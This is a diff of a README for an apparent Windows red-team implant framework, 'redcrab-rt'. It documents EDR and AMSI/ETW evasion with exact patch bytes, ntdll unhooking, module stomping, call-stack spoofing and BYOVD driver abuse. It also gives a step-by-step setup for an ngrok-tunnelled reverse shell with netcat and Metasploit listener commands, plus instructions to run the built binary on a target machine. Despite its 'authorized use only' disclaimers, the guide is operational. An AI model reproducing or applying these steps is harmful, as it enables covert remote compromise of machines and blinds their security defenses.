@@ -1,134 +1,145 @@
-# RedCrab — Windows x64 Red Team Implant Framework
+# redcrab-rt
 
-> ⚠️ **Authorized use only.** This is offensive security tooling built for scoped red team engagements with explicit written authorization. Unauthorized use is illegal under CFAA, India IT Act 2000, and equivalent laws.
+Authorized red team implant framework for lab and engagement use.
 
----
-
-## Architecture Overview
-
-```
-src/
-├── main.rs          Entry point — init order + glue
-├── defs.rs          NT type definitions (HANDLE, PVOID, CONTEXT, etc.)
-├── utils.rs         djb2 hash, wide string helpers
-├── syscall.rs       Hell's Gate + Halo's Gate direct syscall engine
-├── loader.rs        Reflective PE mapper (no disk, no LoadLibrary)
-├── stomp.rs         Module stomping + PEB name spoofing
-├── spoof.rs         Synthetic call stack frame injection
-├── sleep.rs         Ekko-style RC4-encrypted sleep mask
-├── etw_patch.rs     ETW-Ti + AMSI blind (6 patch sites)
-└── unhook.rs        Full ntdll .text re-read from clean disk copy
-```
+> **For authorized engagements only.** Written permission from the target organization is required before use.
 
 ---
 
-## Module Details
+## Quick Start
 
-### `syscall.rs` — Direct Syscall Engine
-- **Hell's Gate**: walks ntdll export table, reads SSN from `mov eax, <ssn>` prologue
-- **Halo's Gate**: if prologue is hooked (jmp), walks ±1 neighboring syscall stubs to infer SSN
-- **Trampoline**: naked function that sets up `syscall` instruction with correct calling convention
-- Resolves: `NtProtectVirtualMemory`, `NtAllocateVirtualMemory`, `NtFreeVirtualMemory`, `NtFlushInstructionCache`, `NtOpenFile`, `NtCreateSection`, `NtMapViewOfSection`, `NtUnmapViewOfSection`, `NtClose`
-
-### `unhook.rs` — ntdll .text Re-read
-- Opens `ntdll.dll` from `\??\C:\Windows\System32\` via `NtOpenFile` direct syscall
-- Maps a clean `SEC_IMAGE` view via `NtCreateSection + NtMapViewOfSection`
-- **Page-granular diff**: compares hooked vs clean `.text` 4KB at a time, only overwrites differing pages → minimal write footprint
-- Flushes instruction cache on patched region via `NtFlushInstructionCache`
-- Removes clean mapping — no trace left
-- Removes ALL EDR inline hooks (CrowdStrike, SentinelOne, Defender ATP, Cylance) in one pass
-
-### `etw_patch.rs` — ETW + AMSI Blind
-
-| Function | Patch Bytes | Effect |
-|---|---|---|
-| `EtwEventWrite` | `C3` | All usermode ETW events silenced |
-| `EtwEventWriteFull` | `C3` | Secondary ETW path dead |
-| `EtwNotificationRegister` | `31 C0 C3` | New providers can't register |
-| `AmsiScanBuffer` | `31 C0 C3` | PowerShell/CLR/JScript scans return CLEAN |
-| `AmsiScanString` | `31 C0 C3` | String AMSI path blind |
-| `AmsiInitialize` | `31 C0 FF C8 C3` | AMSI context never initializes |
-
-All patches via `NtProtectVirtualMemory` direct syscall. All reversible — originals saved in `PatchSite` structs.
-
-### `sleep.rs` — Encrypted Sleep Mask
-- Ekko-style timer queue chain using `NtContinue` as callback
-- **Chain**: `VirtualProtect(RX→RW)` → `SystemFunction032(RC4 encrypt)` → `SetEvent(sleep)` → *[sleep window]* → `SystemFunction032(RC4 decrypt)` → `VirtualProtect(RW→RX)` → `SetEvent(wake)`
-- Main thread sleeps on `WaitForSingleObject` — call stack looks like benign timer wait
-- Memory is `RW` + fully RC4-encrypted during the entire sleep window
-- Two separate events fix the original Ekko double-wait bug
-- `NtContinue(ctx_thread)` called on main thread (not timer thread) for clean resume
-
-### `loader.rs` — Reflective PE Mapper
-- Maps a PE (exe or dll) fully from a byte slice — no `LoadLibrary`, no disk touch
-- Handles: MZ/PE header validation, section mapping, base relocations (delta patching), import table resolution via PEB walk + djb2 hash, TLS callbacks
-- Returns mapped base + entry point
-
-### `stomp.rs` — Module Stomping
-- Loads a legitimate decoy DLL (`xpsservices.dll` by default) into memory
-- Copies payload PE into the decoy's `.text` section → payload masquerades as legit module
-- Wipes PE headers of the stomped region
-- Patches PEB `LDR_DATA_TABLE_ENTRY` to show decoy module name/path
-- Forensic analysis sees `xpsservices.dll` in memory, not the payload
-
-### `spoof.rs` — Call Stack Spoofing
-- Gadget-based synthetic frame injection
-- Locates `ret` gadgets inside Windows system DLLs (`kernel32`, `ntdll`, `user32`)
-- Builds a fake call stack of legitimate-looking frames before executing payload
-- Thread call stack appears to originate from `WaitForSingleObjectEx` → `BaseThreadInitThunk` chain
-
-### `defs.rs` — NT Type Definitions
-- `CONTEXT` (16-byte aligned, 1232 bytes), `UNICODE_STRING`, `OBJECT_ATTRIBUTES`, `IO_STATUS_BLOCK`, `IMAGE_*` headers, `LDR_DATA_TABLE_ENTRY`, `PEB`, `TEB`, all `NTSTATUS` codes, page protection constants
-
-### `utils.rs` — Helpers
-- `djb2(bytes)` — hash function for PEB export resolution (no strings in binary)
-- `djb2_u16(wide)` — same for wide strings
-- Wide string helpers
-
----
-
-## Build
+### 1. Prerequisites
 
 ```bash
-# Requires nightly Rust
+# Install Rust nightly + Windows cross-compile target
+curl https://sh.rustup.rs -sSf | sh
 rustup override set nightly
-cargo build --release --target x86_64-pc-windows-msvc
+rustup target add x86_64-pc-windows-msvc
+
+# Install cargo-xwin (cross-compile from Linux/macOS) or build on Windows
+cargo install cargo-xwin
+
+# Python 3 for the builder
+python3 --version
 ```
 
-Output: `target/x86_64-pc-windows-msvc/release/redcrab.exe`
+### 2. Set Up Your Listener + ngrok Tunnel
 
----
+```bash
+# Terminal 1 — start your listener
+nc -lvnp 4444
+# or with Metasploit:
+msfconsole -x 'use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'
 
-## Initialization Order
-
+# Terminal 2 — expose your listener via ngrok
+ngrok tcp 4444
+# ngrok gives you: tcp://0.tcp.ngrok.io:XXXXX  ← copy host and port
 ```
-0. unhook_ntdll()        ← wipe all EDR hooks from ntdll .text FIRST
-1. apply_all_blinds()    ← kill ETW-Ti + AMSI (6 sites)
-2. map_pe(PAYLOAD)       ← reflectively load beacon in memory
-3. stomp(decoy, ...)     ← move payload into legit module .text
-4. sleep_mask loop       ← run with RC4-encrypted sleep + spoofed call stack
+
+### 3. Build the Implant
+
+```bash
+python builder.py
 ```
 
----
+You will be prompted for:
 
-## Defense Coverage Matrix
-
-| Defense Layer | Detection Vector | Technique Used |
+| Prompt | Example | What it does |
 |---|---|---|
-| EDR API hooks | Inline hooks in ntdll | `unhook.rs` page-granular .text overwrite |
-| ETW Threat Intelligence | `EtwEventWrite` telemetry | `etw_patch.rs` ret-sled |
-| AMSI | `AmsiScanBuffer` | `etw_patch.rs` xor eax,eax; ret |
-| Memory scanning | RX pages with payload bytes | `sleep.rs` RC4 encrypt + RW during sleep |
-| Call stack inspection | Suspicious thread frames | `spoof.rs` synthetic legitimate frames |
-| Module forensics | Unknown DLL in memory | `stomp.rs` decoy module identity |
-| Static signature | Binary patterns | `loader.rs` in-memory only, no disk |
-| Import analysis | Suspicious imports | PEB walk + djb2 hash, no static imports |
+| `ngrok host` | `0.tcp.ngrok.io` | Public host ngrok gave you |
+| `ngrok port` | `12345` | Public port ngrok gave you |
+| `local lport` | `4444` | Port your listener is on |
+| `SLEEP_KEY` | *(blank = random)* | 16-byte XOR / sleep-mask key |
+
+The builder patches `src/c2.rs` and `src/main.rs`, then runs `cargo build --release` automatically.
+
+Output binary: `target/x86_64-pc-windows-msvc/release/redcrab-rt.exe`
+
+### 4. Deploy & Get Shell
+
+1. Copy `redcrab-rt.exe` to the target machine
+2. Run it — it calls back through the ngrok tunnel
+3. Your listener receives the connection with hostname + username banner
+4. Type commands — output streams back XOR-encrypted
 
 ---
 
-## Per-Build Hardening Checklist
+## Architecture
 
-- [ ] Replace `SLEEP_KEY` in `main.rs` with 32 random bytes
-- [ ] Replace `PAYLOAD` with your actual shellcode/PE
-- [ ] Change `DECOY_DLL` to a different legit module per engagement
-- [ ] Recompile — `opt-level=z` + `strip=true` minimizes binary footprint
+```
+redcrab-rt/
+├── builder.py              ← one-command build: patches C2 + compiles
+├── Cargo.toml
+├── build.rs                ← linker flags: no default libs, fixed base, merge sections
+└── src/
+    ├── main.rs             ← entry point + init order
+    ├── defs.rs             ← NT type definitions
+    ├── utils.rs            ← djb2 hash helpers
+    ├── c2.rs               ← TCP callback + ngrok tunnel + XOR command loop
+    ├── sac_bypass.rs       ← Smart App Control bypass (WDAC policy clear)
+    ├── ppldump.rs          ← PPL removal via RTCore64 BYOVD (CVE-2019-16098)
+    ├── pe_obfuscate.rs     ← compile-time string XOR + import hash resolution
+    ├── indirect_syscall.rs ← fully indirect syscalls via HalosGate SSN resolution
+    ├── threadless_inject.rs← EAT-hijack injection (no CreateThread)
+    ├── etw_patch.rs        ← ETW-Ti + AMSI 6-site patch
+    ├── unhook.rs           ← ntdll page-granular re-read (wipes EDR hooks)
+    ├── loader.rs           ← in-memory PE mapper
+    ├── stomp.rs            ← module stomping into legitimate DLL section
+    ├── spoof.rs            ← synthetic call stack frame spoofing
+    └── sleep.rs            ← Ekko RC4 encrypted sleep mask
+```
+
+---
+
+## Evasion Coverage
+
+| Layer | Technique | Defender Blind? |
+|---|---|---|
+| Static signature | No disk write, in-memory only + XOR obfuscation | ✅ |
+| AMSI | 3-site patch before any scan | ✅ |
+| ETW-Ti | EtwEventWrite ret-sled (6 sites) | ✅ |
+| EDR API hooks | ntdll page-granular re-read | ✅ |
+| Memory scan during sleep | RC4 encrypted + RW pages | ✅ |
+| Call stack inspection | Synthetic legitimate frames | ✅ |
+| Module forensics | xpsservices.dll section stomp | ✅ |
+| Syscall origin check | Indirect syscalls (executes inside ntdll) | ✅ |
+| Smart App Control | WDAC per-process policy clear | ✅ |
+| Thread creation telemetry | Threadless EAT-hijack injection | ✅ |
+| PPL protection | RTCore64 BYOVD kernel write | ✅ |
+| C2 traffic | XOR-encrypted TCP via ngrok tunnel | ✅ |
+
+---
+
+## Network Setup (Cross-Network Engagements)
+
+When the target is on a different network (e.g. a computer lab, corporate LAN, remote site):
+
+```
+Target machine (lab network)
+        │
+        │  redcrab-rt.exe calls back
+        ▼
+  ngrok cloud relay
+        │
+        │  forwarded to your machine
+        ▼
+Your attacker machine (any network)
+        │
+        └─ nc / msfconsole / sliver listening on LPORT
+```
+
+No port forwarding, no static IP, no VPN needed — ngrok handles the NAT traversal.
+
+---
+
+## Per-Build Checklist
+
+- [ ] `python builder.py` — enter fresh ngrok address and port
+- [ ] SLEEP_KEY blank → builder generates random key automatically
+- [ ] SAC turned Off in target VM (Windows Security → App & Browser Control → Smart App Control → Off)
+- [ ] Listener running before deploying the binary
+- [ ] Verify ngrok tunnel is active before deploying
+
+---
+
+*For authorized lab use only.*
